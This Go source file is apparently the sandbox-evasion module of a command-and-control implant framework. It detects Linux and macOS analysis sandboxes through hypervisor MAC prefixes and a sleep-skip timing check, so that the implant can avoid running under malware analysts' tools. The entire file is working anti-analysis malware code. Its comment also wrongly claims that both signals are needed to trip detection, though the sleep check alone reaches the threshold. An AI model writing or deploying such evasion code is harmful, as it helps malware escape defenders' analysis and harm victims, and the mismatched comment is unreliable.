//go:build !windows

package evasion

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Cross-platform sandbox detection for Linux/macOS.
//
// We can't match the depth of the Windows checks (no PEB, no registry,
// limited MAC visibility on macOS without elevated perms) so we stick
// to two cheap signals that fire reliably in real-world Linux sandbox
// stacks like Cuckoo-on-Linux and Joe Sandbox's Ubuntu detonators:
//
//   - sleep-skip canary: 2s requested wait, < 1.5s observed = hooked
//   - hypervisor MAC OUI: same VM-vendor prefixes the Windows path uses
//
// Threshold is left at the same conservative value (>=3) as Windows,
// so we need both signals plus another future heuristic before tripping.
// On hosts where neither fires, IsSandbox returns false and the implant
// proceeds normally.

import (
	"net"
	"strings"
	"time"
)

// SandboxReport mirrors the Windows type so the caller can stay
// platform-agnostic.
type SandboxReport struct {
	Detected bool
	Score    int
	Reasons  []string
}

// IsSandbox runs the cross-platform heuristics and returns true if the
// score crosses the detection threshold.
func IsSandbox() bool {
	return Sandbox().Detected
}

// Sandbox returns the full detection report.
func Sandbox() SandboxReport {
	r := SandboxReport{}
	if vmMACDetectedOther(&r) {
		r.Score += 2
	}
	if sleepSkippedOther(&r) {
		r.Score += 3
	}
	r.Detected = r.Score >= 3
	return r
}

func vmMACDetectedOther(r *SandboxReport) bool {
	knownVMPrefixes := []string{
		"00:05:69", "00:0c:29", "00:1c:14", "00:50:56", // VMware
		"08:00:27", "0a:00:27", // VirtualBox
		"00:15:5d", "00:03:ff", // Hyper-V
		"52:54:00", // QEMU/KVM
		"00:16:3e", // Xen
		"00:1c:42", // Parallels
	}
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		mac := strings.ToLower(iface.HardwareAddr.String())
		if len(mac) < 8 {
			continue
		}
		for _, p := range knownVMPrefixes {
			if mac[:8] == p {
				r.Reasons = append(r.Reasons, "vm-mac:"+mac[:8])
				return true
			}
		}
	}
	return false
}

func sleepSkippedOther(r *SandboxReport) bool {
	start := time.Now()
	time.Sleep(2 * time.Second)
	if time.Since(start) < 1500*time.Millisecond {
		r.Reasons = append(r.Reasons, "sleep-skip")
		return true
	}
	return false
}
